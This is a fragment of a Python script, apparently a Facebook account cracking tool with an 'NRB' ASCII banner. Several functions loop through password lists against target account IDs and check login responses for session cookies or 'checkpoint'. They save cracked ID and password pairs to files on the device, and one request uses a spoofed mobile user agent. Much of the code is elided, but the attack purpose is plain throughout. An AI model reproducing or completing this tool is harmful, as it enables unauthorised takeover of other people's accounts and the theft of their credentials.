...
def menu_apikey():
  ...
  os.system(f" clear")                          
  print(f"""\x1b[1;97m
d8b   db d8888b. d8888b.    db    db d8888b. 
888o  88 88  `8D 88  `8D    `8b  d8' 88  `8D 
88V8o 88 88oobY' 88oooY'     `8bd8'  88   88 
88 V8o88 88`8b   88~~~b.     .dPYb.  88   88 
88  V888 88 `88. 88   8D db .8P  Y8. 88  .8D 
VP   V8P 88   YD Y8888P' VP YP    YP Y8888D' 
...
def ffb(ids,names,passlist):
        global loop,oks,cps
        sys.stdout.write(f'\r\r\033[1;37m [NRB] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
        ...
        try:
                ...
                for fikr in passlist:
                        ...
                        if "c_user" in Shahin:
                                ...
                                print(f'\r\r\033[1;32m [NRB-OK] %s | %s'%(ids,pas))
                                open(f'/sdcard/NRB-OK.txt', 'a').write(ids+'|'+pas+'\n')
                                #cek_apk(session,coki)
                                oks.append(ids)
                                break
                        elif 'checkpoint' in Shahin:
                                if 'y' in pcp:
                                        print(f'\r\r\x1b[38;5;126m [NRB-CP] '+ids+' | '+pas+'\033[1;97m')
                                        open(f'/sdcard/NRB-CP.txt', 'a').write(ids+'|'+pas+'\n')
                                        cps.append(ids)
                                        break
                                else:
                                        break
...
def ffb3(ids,names,passlist):
        global loop,oks,cps
        sys.stdout.write(f'\r\r\033[1;37m [XD] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
        session = requests.Session()
        try:
                first = names.split(f' ')[0]
                try:
...
def ffb4(ids,names,passlist):
        global loop,oks,cps
        sys.stdout.write(f'\r\r\033[1;37m [XD-VIP] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
        session = requests.Session()
        try:
                first = names.split(f' ')[0]
                try:
...
def api(ids,names,passlist):
                try:
                        ...
                        for pw in passlist:
                                ...
                                q = json.loads(po)
                                if 'session_key' in q:
                                        print(f'\r\r\033[1;32m [NRB-OK] '+ids+' | '+pas+'\033[1;97m')
                                        open(f'/sdcard/NRB-OK.txt','a').write(ids+'|'+pas+'\n')
                                        #cek_apk(session,coki)
                                        oks.append(ids)
                                        break
	...
	#		print(idf+'|'+ps)
           ...
           'user-agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 9_2 like Mac OS X) AppleWebKit/601.1.46 (KHTML, like Gecko) Version/9.0 Mobile/13C75 Safari/601.1',}
			...
			if 'c_user' in log_cookies:
				...
				cid = coki[151:166]
				print('\n')
				print('\033[1;92m[NRB-OK] '+idf+' | '+ps+'\033[0;97m')
				cek_apk(coki)
				...
				cid = coki[141:156]
				print('\n')
				print('\033[1;91m[NRB-CP] '+idf+' | '+ps+'\033[0;97m')
		...
		sys.stdout.write(f'\r\r\033[1;37m [NRBXD-VIP] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
		sys.stdout.flush()
